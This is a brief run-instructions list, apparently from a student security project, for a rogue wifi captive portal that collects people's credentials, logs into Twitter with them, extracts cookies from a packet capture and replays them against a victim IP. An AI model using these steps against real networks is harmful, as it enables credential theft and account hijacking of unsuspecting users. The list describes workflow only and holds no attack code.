1. Set up wifi device
2. bash cs378_project.sh
3. Wait, press enter at a couple points to ensure everything looks correct
4. Captive portal will go up
5. Connect/wait for people to connect to Captive portal
6. Can be run during or after portal with user creds: python twitterlogin.py
7. Cookie extracting from the tshark pcap
8. python3 extract_packets.py <pcap file> <sqlite3 db> <port PHP is running on (8000)> 
9. python3 browse_cookies.py <victim_ip> <website to spoof> <sqlite3 db>

